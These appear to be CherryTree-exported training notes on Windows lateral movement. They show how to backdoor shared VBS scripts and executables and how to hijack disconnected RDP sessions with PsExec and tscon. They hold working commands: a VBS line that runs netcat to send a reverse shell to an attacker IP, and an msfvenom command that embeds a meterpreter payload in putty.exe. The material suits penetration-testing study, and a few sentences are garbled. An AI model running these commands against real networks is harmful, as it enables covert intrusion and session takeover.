<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Abusing User Behaviour</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Abusing User Behaviour</h1><br/><strong><h1>Abusing User Behaviour</h1></strong><br /><br />Under certain circumstances, an attacker can take advantage of actions performed by users to gain further access to machines in the network. While there are many ways this can happen, we will look at some of the most common ones.<br /><br /><strong><h3>A) Abusing Writable Shares</h3></strong><br /><br />It is quite common to find network shares that legitimate users use to perform day-to-day tasks when checking corporate environments. If those shares are writable for some reason, an attacker can plant specific files to force users into executing any arbitrary payload and gain access to their machines.<br /><br />One common scenario consists of finding a shortcut to a script or executable file hosted on a network share.<br /><br /><img src="images/340-1.png" alt="images/340-1.png" /><br /><br />The rationale behind this is that the administrator can maintain an executable on a network share, and users can execute it without copying or installing the application to each user&#39;s machine. If we, as attackers, have write permissions over such scripts or executables, we can backdoor them to force users to execute any payload we want.<br /><br />Although the script or executable is hosted on a server, when a user opens the shortcut on his workstation, the executable will be copied from the server to its <strong>%temp%</strong> folder and executed on the workstation. Therefore any payload will run in the context of the final user&#39;s workstation (and logged-in user account).<br /><br /><strong><span style="text-decoration:underline;">I) Backdooring .vbs script</span></strong><br /><br />As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:<br /><br /><strong>CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% &amp; %tmp%\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 1234&quot;, 0, True</strong><br /><br />This will copy nc64.exe from the share to the user&#39;s workstation %tmp% directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.<br /><br /><strong><span style="text-decoration:underline;">II) Backdooring .exe Files</span></strong><br /><br />If the shared file is a Windows binary, say putty.exe, you can download it from the share and use  into it. The <strong>binary</strong> will still <strong>work</strong> as <strong>usual</strong> but <strong>execute</strong> an additional <strong>payload</strong> <strong>silently</strong>. To create a backdoored putty.exe, we can use the <strong>msfvenom to inject a backdoor</strong>following command:<br /><br /><strong>msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe</strong><br /><br />The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit.<br /><br /><br /><strong><h3>B) RDP hijacking</h3></strong><br /><br />When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have <strong>SYSTEM privileges</strong> on <strong>Windows Server 2016 and earlier</strong>, you can take over any existing RDP session without requiring a password.<br /><br />If we have administrator-level access, we can get <strong>SYSTEM</strong> by any <strong>method</strong> of our <strong>preference</strong>. For now, we will be using psexec to do so. First, let&#39;s run a cmd.exe as administrator:<br /><br /><img src="images/340-2.png" alt="images/340-2.png" /><br /><br />From there, run PsExec64.exe(available at C:\tools\): [To get System Access]<br /><br /><strong>PsExec64.exe -s cmd.exe</strong><br /><br />To list the existing sessions on a server, you can use the following command:<br /><br /><strong>query user</strong><br /><br /><img src="images/340-3.png" alt="images/340-3.png" /><br /><br />According to the command output above, if we were currently connected via RDP using the <strong>administrator</strong> user, our SESSIONNAME would be <strong>rdp-tcp#6</strong>. We can also see that a user named <strong>luke</strong> has left a session open with id <strong>3</strong>. Any session with a <strong>“Disc”</strong> [Disconnected] state has been left open by the user and isn&#39;t being used at the moment. While you <strong>can</strong> take over <strong>active</strong> <strong>sessions</strong> as well, the <strong>legitimate user</strong> will be <strong>forced</strong> <strong>out</strong> of his <strong>session</strong> when you do, which could be noticed by them.<br /><br />To connect to a session, we will use <strong>tscon.exe</strong> and specify the <strong>session ID</strong> we will be taking over, as well as our current <strong>SESSIONNAME</strong>. Following the previous example, to takeover luke&#39;s session if we were connected as the administrator user, we&#39;d use the following command:<br /><br /><strong>tscon 3 /dest:rdp-tcp#6</strong><br /><br />In simple terms, the command states that the graphical <strong>session</strong> <strong>3</strong> owned by <strong>luke</strong>, should be connected with the RDP session <strong>rdp-tcp#6</strong>, owned by the <strong>administrator</strong> user.<br /><br />As a result, we&#39;ll resume luke&#39;s RDP session and connect to it immediately.<br /><br /><strong>Note:</strong> <strong>Windows Server 2019</strong> won&#39;t allow you to connect to another user&#39;s session without knowing its <strong>password</strong>.<br /><br /></div>
</body>
</html>
